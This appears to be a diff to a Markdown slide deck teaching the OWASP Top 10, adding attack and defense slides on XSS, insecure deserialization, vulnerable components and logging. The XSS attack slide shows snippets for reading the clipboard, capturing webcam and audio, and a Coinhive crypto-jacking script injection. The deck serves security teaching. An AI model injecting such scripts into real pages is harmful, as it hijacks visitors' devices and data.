@@ -1,13 +1,6 @@
 ## OWASP Top 10 Examples
 <hr />
 
-Work in progress
-
---
-
-## OWASP Top 10 Examples
-<hr />
-
 ### Disclaimer: Don't try this at home
 
 ![](pics/dont_try_this_at_home.jpg)
@@ -497,12 +490,56 @@ GET http://canadian-business-news/company/maple-syrup-inc/2019-Q2.pdf
 
 [Harlem Shake](https://www.youtube.com/watch?v=K0noqLisW_c)
 
+--
+
+## Cross-Site Scripting (XSS): attack
+<hr />
+
+![](pics/XSSExample.png)
+
+--
+
+## Cross-Site Scripting (XSS): attack
+<hr />
+
+Read clipboard:
+```javascript
+window.clipboardData.getData('Text');
+```
+
+Webcam video & audio:
+```javascript
+stream = await navigator.mediaDevices.getUserMedia(constraints);
+```
+
+
+Crypto-jacking:
+```javascript
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('<my account id>');
+  miner.start();
+</script>
+```
 
 --
 
 ## Cross-Site Scripting (XSS): defense
 <hr />
 
+* Input validation
+* Content escaping (context aware)
+* Content encoding (context aware)
+* Content-Security-Policy: script-src 'self' 
+
+-- Notes --
+
+Escape for the correct context:
+* body
+* attribute
+* JavaScript
+* CSS
+* URL
 
 --
 
@@ -510,7 +547,11 @@ GET http://canadian-business-news/company/maple-syrup-inc/2019-Q2.pdf
 <hr />
 
 * OWASP on [2017-A7 Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_%28XSS%29)
-
+* OWASP [XSS Prevention Cheat sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
+* XSS types:
+  * [Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29)
+  * [Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29)
+  * [DOM-based XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29)
 
 --
 
@@ -531,12 +572,39 @@ GET http://canadian-business-news/company/maple-syrup-inc/2019-Q2.pdf
 ## Insecure Deserialization: attack
 <hr />
 
+![](pics/insecure-deserialization.png)
+
+--
+
+## Insecure Deserialization: attack
+<hr />
+
+* Deserialize an object from untrusted source
+* Execute based on that object:
+  * compare()
+  * equals()
+
+--
+
+## Insecure Deserialization: attack
+<hr />
+
+![](pics/jenkins_XMRminer.png)<!-- .element style="box-shadow:none; position: fixed; right: 50px; top: 200px; width: 400px;" -->
+
+[Jenkins Miner](https://research.checkpoint.com/jenkins-miner-one-biggest-mining-operations-ever-discovered/) exploiting [CVE-2017-1000353](https://nvd.nist.gov/vuln/detail/CVE-2017-1000353) in Jenkins up to 2.56
+[Struts 2](https://www.youtube.com/watch?v=QQxBukCSW8E) RCE demo
 
 --
 
 ## Insecure Deserialization: defense
 <hr />
 
+* Integrity checks (eg. digital signatures)
+* Strict type constraints before object creation
+* Isolate deserializing code in low privilege env
+* Log exceptions and failures
+* Restrict or monitor network connectivity from deserializing containers or servers
+* Monitor deserialization and alert constant deserialization
 
 --
 
@@ -544,11 +612,12 @@ GET http://canadian-business-news/company/maple-syrup-inc/2019-Q2.pdf
 <hr />
 
 * OWASP on [2017-A8 Insecure Deserialization](https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization)
-
+* OWASP [Deserialization Cheat sheet](https://www.owasp.org/index.php/Deserialization_Cheat_Sheet)
+* [Slidedeck](https://speakerdeck.com/pwntester/surviving-the-java-deserialization-apocalypse) by [Alvaro Muñoz](https://twitter.com/pwntester) and [Christian Schneider](https://twitter.com/cschneider4711)
 
 --
 
-## OWASP 2017-A9: Using Components with Known Vulnerabilities
+## OWASP 2017-A9: Known Vulnerabilities
 <hr />
 
 | Year  | Position  | Name                                          |
@@ -562,23 +631,58 @@ GET http://canadian-business-news/company/maple-syrup-inc/2019-Q2.pdf
 
 --
 
-## Using Components with Known Vulnerabilities: attack
+## Known Vulnerabilities: attack
 <hr />
+
+![](pics/vuln_components.jpg)<!-- .element style="box-shadow:none; position: fixed; left: 50px; top: 200px; width: 400px;" -->
+![](pics/vuln_components2.png)<!-- .element style="box-shadow:none; position: fixed; left: 20px; bottom: 50px; width: 300px;" -->
+![](pics/vuln_components3.jpg)<!-- .element style="box-shadow:none; position: fixed; right: 20px; top: 150px; width: 300px;" -->
+![](pics/vuln_components4.jpg)<!-- .element style="box-shadow:none; position: fixed; right: 150px; bottom: 20px; width: 400px;" -->
+
+[Ghetto Car Repairs](https://www.google.com/search?q=ghetto+car+repairs&tbm=isch)
+
+--
+
+## Known Vulnerabilities: attack
+<hr />
+
+[Jenkins Miner](https://research.checkpoint.com/jenkins-miner-one-biggest-mining-operations-ever-discovered/) exploiting [CVE-2017-1000353](https://nvd.nist.gov/vuln/detail/CVE-2017-1000353) in Jenkins up to 2.56
+[Struts 2](https://www.youtube.com/watch?v=QQxBukCSW8E) RCE demo
+
+Enables all other vulnerabilites. Hacker Cheat-mode:
+
+![](pics/x-powered-by.png)
 
 
 --
 
-## Using Components with Known Vulnerabilities: defense
+## Known Vulnerabilities: defense
 <hr />
 
+* Remove unused dependencies, features, components, files and documentation
+* Inventory component versions and dependencies:
+   * DependencyCheck
+   * retire.js
+* Monitor sources like CVE and NVD for vulnerabilities
+* Automate & alert
+* Subscribe to Email alerts for relevant components
+* Obtain components from official sources over secure links
+  * Signed & checked components (SHA256+)
+* Monitor for unmaintained libraries and components
+  * No security patches
+* Virtual patch
 
 --
 
-## Using Components with Known Vulnerabilities: further reading
+## Vulnerabilities: further reading
 <hr />
 
 * OWASP on [2017-A9 Using Components with Known Vulnerabilities](https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities)
-
+* [13 tools for CVE](https://techbeacon.com/app-dev-testing/13-tools-checking-security-risk-open-source-dependencies) detection in Open Source dependencies
+* [Harvesting CC numbers and passwords](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5) from your site using dependencies
+* [Stop harvesting CC numbers and passwords](https://hackernoon.com/part-2-how-to-stop-me-harvesting-credit-card-numbers-and-passwords-from-your-site-844f739659b9)
+* Snyk [State of Open Source 2019](https://snyk.io/opensourcesecurity-2019/)
+* Snyk [Top 10 Docker images contain 30+ vulnerabilities](https://snyk.io/blog/top-ten-most-popular-docker-images-each-contain-at-least-30-vulnerabilities/)
 
 --
 
@@ -599,14 +703,34 @@ GET http://canadian-business-news/company/maple-syrup-inc/2019-Q2.pdf
 ## Insufficient Logging & Monitoring: attack
 <hr />
 
+* Logging sensitive data
+
 ![](pics/facebook_passwords.png)
 ![](pics/facebook_thumbs_down.png)<!-- .element style="width: 400px;" -->
 
 --
 
-## Insufficient Logging & Monitoring: defense
+## Insufficient Logging & Monitoring: <s>attack</s> broken defense
 <hr />
 
+* Not logging relevant events
+* Incorrect log-level on relevant events
+* No clear logging
+* Not monitoring / alerts on relevant events
+* No action taken on relevant events
+* Logs not aggregated for easy access
+
+--
+
+## Insufficient Logging & Monitoring: defense
+<hr />
+* Log all login, access control and server-side input validation failures
+* Sufficient context
+* Archive long enough for analysis
+* Generic format for log-aggregation
+* Audit trails with integrity controls for high-value transactions
+* (Near) Realtime monitoring & alerting process
+* Incident repsonse & recovery process
 
 --
 
@@ -614,5 +738,9 @@ GET http://canadian-business-news/company/maple-syrup-inc/2019-Q2.pdf
 <hr />
 
 * OWASP on [2017-A10 Insufficient Logging & Monitoring](https://www.owasp.org/index.php/Top_10-2017_A10-Insufficient_Logging%26Monitoring)
-
+* OWASP [Security Logging](https://www.owasp.org/index.php/OWASP_Security_Logging_Project) project
+* [9 logging sincs in Java](https://stackify.com/9-logging-sins-java/)
+* [Spring Boot Authentication Audit](https://www.baeldung.com/spring-boot-authentication-audit)
+* [Splunk](https://www.splunk.com/en_us/download/splunk-enterprise.html)
+* [Elastic Stack](https://www.elastic.co/products/)
 
